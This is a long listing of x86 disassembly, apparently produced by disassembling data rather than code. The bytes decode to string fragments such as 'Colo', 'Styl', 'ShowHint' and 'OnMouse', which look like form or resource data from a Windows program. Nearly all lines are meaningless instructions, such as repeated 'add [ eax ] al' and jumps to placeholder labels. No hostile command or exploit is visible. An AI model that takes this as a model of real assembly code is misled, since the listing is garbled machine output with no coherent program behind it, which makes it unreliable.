imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cmp eax [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0025 ] al
outsb
inc esp
outsd
ja r-xdata
outsb
jb r-xdata
add [ eax ] al
add [ eax + 0x4f090023 ] al
outsb
dec ebp
outsd
jne r-xdata
pop eax
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09001f ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
adc [ eax ] al
push edi
je r-xdata
outsb
jpo r-xdata
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
nop
inc edx
add al dh
jb r-xdata
sar [ 0xd80044 ] 0x1
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
outsb
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
push ds
add [ edx ] cl
dec edi
aas
inc esp
add [ eax ] cl
add al dl
fild [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xdc
push ebp
jo r-xdata
add [ eax ] al
sbb [ eax + eax ] 0xa
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941da1a
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001d ] al
outsb
inc esp
jb r-xdata
push esi
inc ecx
add [ eax ] ch
add [ eax ] eax
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
or eax [ edx ]
jl r-xdata
inc edx
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ eax ] dh
add [ eax - 0xfffbd0e ] dl
inc esp
outsd
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0026 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
push ebx
je r-xdata
add [ eax ] al
and [ eax + eax ] 0x7
dec edi
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
push esi
inc ecx
add [ eax + 0x1 ] ch
add bh bh
push 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
add [ eax ] 0x0
add [ eax + 0x4f090020 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add bh ch
inc [ eax ]
hlt
add [ esi + ecx - 0xdbfffbe ] ah
inc edx
add [ ecx ] al
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
or eax [ fs : edx ]
xor [ edx ] cl
inc edx
add [ ebx + ecx + 0x42 ] dh
jb r-xdata
popad
pop eax
cmp eax 0xe00044
add bh bh
loopne r-xdata
cmp eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
or ecx [ edi + 0x6e ]
jo r-xdata
inc esp
jb r-xdata
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or [ edi + 0x6e ] ecx
[ eax ]
add [ eax + 0x4f0a001e ] al
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
or al [ edx ]
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ edx ]
or ah bl
inc edx
add [ eax + eax ] al
add ah dl
imul eax [ ecx ] sub_420e84
int3
lea eax [ bx + si ]
rcr bl 0x1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 8 ] dl
sub_42dd5a
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax - 0x6fffbb0f ] dh
rol [ ebx ] cl
fdivr [ ecx - 0x3883ffbc ]
inc esp
add ah ch
rol [ ebx ] cl
les eax [ fs : eax + eax - 0x6c ]
retn 0x44
sub_42de5d
test [ edx ] sub_44fdf4
sbb al 0xc6
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax ] ah
cli
inc edx
add ah al
jg r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add [ edx + edi * 8 ] dh
inc edx
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx - 0x8cbffbe ] ah
inc edx
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add [ eax + edx ] cl
inc ebp
add ah ah
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add ah bh
rol [ ebx ] cl
pushfd
cld
inc edx
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
inc eax
fild [ edx ]
pop es
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
pushad
fiadd [ edx ]
call 0x2f432233
add [ eax ] cl
inc ebp
js r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x10 ]
int3
add al cl
in al dx
inc esp
add [ eax - 0x6fffbb0f ] dh
rol [ ebx ] cl
fdivr [ ecx - 0x3883ffbc ]
inc esp
add ah ch
rol [ ebx ] cl
les eax [ fs : eax + eax - 0x6c ]
retn 0x44
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
and al 0x8b
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
xor ah 0xff
imul ebp [ edi + 0x6e ] sub_421d60
jo r-xdata
stosb [ edi ]
mov eax [ eax + eax - 0x10 ]
insb
jae r-xdata
add bh bh
xchg esp eax
mov [ eax + eax - 0x50 ] es
mov [ eax + eax ] es
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ ecx ] ah
add bh bh
dec eax
jle r-xdata
add al al
xor al 0x44
add [ ebx ] bl
add bh bh
or [ eax + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
hlt
inc ebx
adc [ eax ] al
sbb al 0x2
add bh bh
cwde
cli
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
add al dh
add ah ah
jle r-xdata
add [ gs : eax ] dl
xor eax [ eax + ebp * 4 + 0x34 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ esp + esi * 8 ]
inc esp
add [ eax - 0xc ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
int3
jae r-xdata
add bh bh
call 0xfffffffff8432570
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
jb r-xdata
add [ 0x6d657449 ] al
jae r-xdata
adc [ eax ] al
sbb [ edx ] al
add bh bh
sar dl 0x1
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
cmp eax [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ edx ] ah
inc edx
add [ eax ] ch
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0019 ] al
outsd
outsb
jae r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ esi ] cl
outsb
je r-xdata
mov [ eax + eax + 0x1 ] es
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
outsb
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
hlt
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsb
adc [ eax ] al
test eax 0x4cff0001
hlt
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
sbb al 0x0
add [ eax ] al
add [ eax + 0x1 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] r--data
adc [ eax ] al
fadd [ eax * 2 + 0xbc00 ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
je r-xdata
outsb
jpo r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
js r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
adc al 0x8a
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
outsb
je r-xdata
cmp eax [ eax + eax + 0x78 ]
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
outsd
ja r-xdata
inc esp
add al bh
hlt
adc [ eax ] al
0x68ff0000 0x448c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax ]
cmc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
and [ esp + eax * 2 + 0x100 ] cl
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x14656c62
push esi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
push edi
add [ eax ] al
call [ edx + ecx * 4 ]
adc [ eax ] al
cdq
add [ eax ] al
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080021 ] al
push 0x6948776f
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ eax - 0x80000000 ] al
and eax 0x6e4f0700
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
mov eax 0x100448c
add [ eax ] al
js r-xdata
push ebx
je r-xdata
adc al 0x56
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push eax
outsd
jo r-xdata
jae r-xdata
jb r-xdata
push ebx
je r-xdata
jb r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
push cs
arpl [ edx + 0x53 ] sp
arpl [ edx + 0x45 ] sp
jns r-xdata
push ebx
inc esp
outsd
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
arpl [ ebp + esi * 2 + 0x64 ] bp
dec esi
jb r-xdata
add [ eax ] al
sub [ eax + eax ] 0x6
dec edi
outsb
inc ebp
js r-xdata
push esi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
dec edi
jbe r-xdata
aas
inc esp
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi fs
inc edx
add [ esi - 0x57ffbd1a ] ah
add al [ eax ]
add al al
je r-xdata
insb
in al 0x42
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
mov al 0x43
add [ esi + ecx + 0x34cc0042 ] al
inc eax
je r-xdata
jne r-xdata
popa
inc esp
jb r-xdata
add [ esi ] al
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
insb
in eax 0x42
insd
inc ebx
outsd
or eax 0x72506263
je r-xdata
arpl [ edx + 0x43 ] sp
jne r-xdata
outsd
outsb
adc [ gs : ebx + 0x62 ] ah
dec ecx
outsb
dec esi
lea eax [ bx + si ]
jo r-xdata
dec esi
outsb
popad
jb r-xdata
add [ eax + 0x4f09002a ] al
outsb
add [ eax ] al
inc ecx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
aas
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] bl
enter 0x44 0x40
loop r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x14 ]
cli
inc ebx
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ edi + ebp * 8 - 0x3b9bffbd ] ch
inc esp
add ah bl
inc [ edx ]
adc al 0xc8
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x1959ffbe ] cl
or eax 0x6e496263
or al 0xef
jns r-xdata
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002e ] al
outsb
inc edx
add [ ebx ] al
andps xmm0 [ ebx + 0x6f ]
insb
outsd
jb r-xdata
nop
inc ebp
js r-xdata
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax + 0x4f07002b ] al
add [ eax ] al
inc ebx
add [ eax - 0x1b ] al
inc ebx
add [ eax - 0x6 ] ch
inc ebx
add [ eax + 0x580043ef ] cl
jecxz r-xdata
add [ eax - 0xf ] dl
inc ebx
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ esi + ebp * 8 ] bl
inc ebx
add al dh
loop r-xdata
add al bl
test al 0x2
add [ eax ] al
shl [ eax + 0xe840043 ] 0x42
add ah cl
xor al 0x40
popad
pop es
inc edx
insd
inc ebx
outsd
insb
outsd
jb r-xdata
insb
outsd
jb r-xdata
outsd
js r-xdata
outsd
inc esp
inc ebx
inc edx
add [ eax - 0x3ffffffe ] ch
je r-xdata
js r-xdata
js r-xdata
adc [ ebx + 0x62 ] ah
inc ebp
jb r-xdata
add [ edx + edi * 8 + 0x43 ] bl
add [ eax ] ch
out dx al
inc ebx
add [ ebp * 8 + 0x2c0043 ] dh
inc ebx
add [ eax - 0x8 ] bh
inc ebx
add [ eax - 0x11 ] cl
inc ebx
add [ eax + 0x4004302 ] dl
add [ eax - 0x45004301 ] dh
push [ edx + 0x42fca8ff ]
add [ edx + eax ] al
inc ebx
add [ edx + eax ] bl
add [ ebx ] bl
inc ebx
add [ eax ] dh
out dx al
or [ ebp + 0x78 ] al
arpl [ edx + 0x50 ] sp
jb r-xdata
arpl [ ebp + esi * 2 + 0x64 ] bp
inc esp
popa
bound ecx [ ecx + 0x6e ]
je r-xdata
inc ebx
add ah dh
std
inc esp
add [ esi + eax * 8 ] bl
add [ edi + ebp * 8 ] cl
je r-xdata
add [ ecx + ecx * 4 ] cl
inc ecx
add [ edx + eax + 0x43 ] dh
add ah al
jg r-xdata
insb
jae r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] dl
inc edx
add [ eax + 0x20000002 ] ch
outsd
js r-xdata
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
or al 0xef
inc ebx
add ah dh
std
inc esp
inc eax
je r-xdata
inc ebx
add [ eax + 0xf004305 ] dh
push esp
inc ebx
jne r-xdata
sbb al 0x2
add [ eax - 0x14 ] bh
je r-xdata
insd
jae r-xdata
insb
jae r-xdata
add [ esi + ecx - 0x93ffbe ] ah
inc edx
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
add [ ebx + ecx + 0x42 ] bh
add [ ebp - 0x1a93ffc0 ] cl
inc edx
insb
add [ gs : esp + 0x42 ] ebp
or ch ah
inc edx
add [ esi ] al
push cs
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
inc ebx
add [ edx ] dl
inc ebx
add [ eax - 0x13 ] bl
inc ebx
add [ ebp + ebp * 8 + 0x43 ] ah
add al dh
in eax dx
inc ebx
add [ eax + 0x64004542 ] al
loop r-xdata
sar [ esi + 0xf070042 ] 0x54
inc ebx
jne r-xdata
aam 0x34
insd
inc ebx
outsd
insb
outsd
add [ eax ] al
add [ eax ] al
add [ esp + 0x42 ] ch
add [ eax ] dl
arpl [ edx + 0x53 ] sp
je r-xdata
add [ eax ] al
add [ eax ] al
push es
add [ eax ] bl
enter 0x44 0x40
loop r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x14 ]
cli
inc ebx
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ edi + ebp * 8 - 0x3b9bffbd ] ch
inc esp
add ah bl
inc [ edx ]
adc al 0xc8
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
inc ecx
add [ edx + eax + 0x43 ] dh
add ah al
jg r-xdata
mov [ eax + eax + 0xc ] 0x89
je r-xdata
inc ebx
add [ eax - 0x1b ] al
inc ebx
add [ eax - 0x6 ] ch
inc ebx
add [ eax + 0x580043ef ] cl
jecxz r-xdata
add [ eax - 0xf ] dl
inc ebx
add al dh
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
insd
inc ebx
outsd
insb
outsd
jb r-xdata
inc ebp
js r-xdata
add [ edx + edi * 8 + 0x43 ] bl
add [ eax ] ch
out dx al
inc ebx
add [ ebp * 8 + 0x2c0043 ] dh
inc ebx
add [ eax - 0x8 ] bh
inc ebx
add [ eax - 0x11 ] cl
inc ebx
add [ eax + 0x9004302 ] dl
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ ebx ] bl
inc ebx
add [ eax ] dh
out dx al
inc ebx
add [ edx ] dl
inc ebx
add [ eax - 0x13 ] bl
inc ebx
add [ ebp + ebp * 8 + 0x43 ] ah
add al dh
in eax dx
inc ebx
add [ eax + 0x64004542 ] al
loop r-xdata
in eax 0x42
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
outsd
js r-xdata
jne r-xdata
inc ebx
je r-xdata
or al 0x41
outsd
js r-xdata
push esp
inc ebx
outsd
add [ eax - 0x14 ] bh
in eax 0x42
add [ edx + esi * 4 + 0x43 ] bh
add [ ebx ] cl
add [ eax ] cl
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] dl
add [ 0x6c797453 ] al
je r-xdata
insb
insb
jae r-xdata
push cs
outsd
inc ebx
outsd
insd
jo r-xdata
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ esi + ebp * 8 ] bl
inc ebx
add al dh
loop r-xdata
inc esp
insb
outsd
jb r-xdata
shl [ eax - 0x18 ] 0x42
add [ edi ] al
or [ ebx + eax * 2 + 0x6f ] edx
imul eax [ edx ] 0x269ff00
add bh bh
add [ eax ] eax
outsd
js r-xdata
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
inc ebx
je r-xdata
hlt
add [ eax ] al
outsd
insb
outsd
jb r-xdata
[ ecx + 0x2 ]
add [ eax ] al
adc [ eax ] al
push 0x68ff0002
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
je r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] al
je r-xdata
add [ eax ] al
str [ eax ]
outsd
inc esp
jb r-xdata
jne r-xdata
out 0x42 eax
add [ eax + 0x3a0042e6 ] bh
add [ eax ] cl
add [ esi + ecx - 0x93ffbe ] ah
inc edx
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
test [ ebx ] cl
inc edx
add [ ebx + ecx + 0x42 ] bh
insb
jae r-xdata
outsd
insb
outsd
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insb
push 0x1473726f
dec ebx
inc esp
add [ edx + 0x1 ] ah
add bh bh
xor al 0x0
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
sbb eax 0x1c40042
inc ebx
add [ esi + eax ] bl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
or al 0x41
jne r-xdata
add [ eax ] dl
inc eax
add [ ecx + 0x2 ] ch
add bh bh
imul eax [ edx ] 0x1ff00
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
add al 0xe5
inc edx
add [ eax - 0x3b00fffe ] bl
push es
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
adc [ eax ] al
add eax 0x6c797453
add [ eax ] al
add [ edi ] cl
jo r-xdata
add [ ebx + 0x42e730c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] ah
sbb eax 0x2a00042
add bh bh
or [ esi ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ss
add [ 0x6f6c6f43 ] al
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
jbe r-xdata
add [ eax ] al
adc eax 0x65420a00
insb
inc ebp
jae r-xdata
add [ esi ] cl
dec esi
outsd
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ esi ] cl
outsd
ja r-xdata
push eax
add [ eax ] eax
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
insb
dec edi
jne r-xdata
add [ eax ] 0x0
dec edx
inc esp
add [ ebx + 0x1 ] ah
add bh bh
[ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] cl
pushad
sbb eax 0x29c0042
add bh bh
